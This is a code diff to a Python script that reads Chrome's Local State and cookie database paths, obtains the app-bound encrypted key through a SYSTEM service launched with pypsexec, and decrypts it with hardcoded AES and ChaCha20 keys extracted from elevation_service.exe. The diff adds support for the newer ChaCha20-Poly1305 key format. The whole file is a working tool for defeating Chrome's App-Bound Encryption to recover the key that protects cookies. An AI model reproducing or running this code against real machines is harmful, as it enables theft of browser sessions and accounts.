@@ -3,7 +3,7 @@ import json
 import sys
 import binascii
 from pypsexec.client import Client
-from Crypto.Cipher import AES
+from Crypto.Cipher import AES, ChaCha20_Poly1305
 import sqlite3
 import pathlib
 
@@ -11,7 +11,7 @@ user_profile = os.environ['USERPROFILE']
 local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
 cookie_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
 
-with open(local_state_path, "r") as f:
+with open(local_state_path, "r", encoding="utf-8") as f:
     local_state = json.load(f)
 
 app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
@@ -47,23 +47,30 @@ try:
     )
 
     decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]
-    assert(decrypted_key[0] == 1)
 
 finally:
     c.remove_service()
     c.disconnect()
 
-# decrypt key with AES256GCM
-# aes key from elevation_service.exe
-aes_key = binascii.a2b_base64("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
+# decrypt key with AES256GCM or ChaCha20Poly1305
+# key from elevation_service.exe
+aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
+chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
 
 # [flag|iv|ciphertext|tag] decrypted_key
 # [1byte|12bytes|variable|16bytes]
+flag = decrypted_key[0]
 iv = decrypted_key[1:1+12]
 ciphertext = decrypted_key[1+12:1+12+32]
 tag = decrypted_key[1+12+32:]
 
-cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
+if flag == 1:
+    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
+elif flag == 2:
+    cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
+else:
+    raise ValueError(f"Unsupported flag: {flag}")
+
 key = cipher.decrypt_and_verify(ciphertext, tag)
 print(binascii.b2a_base64(key))
 
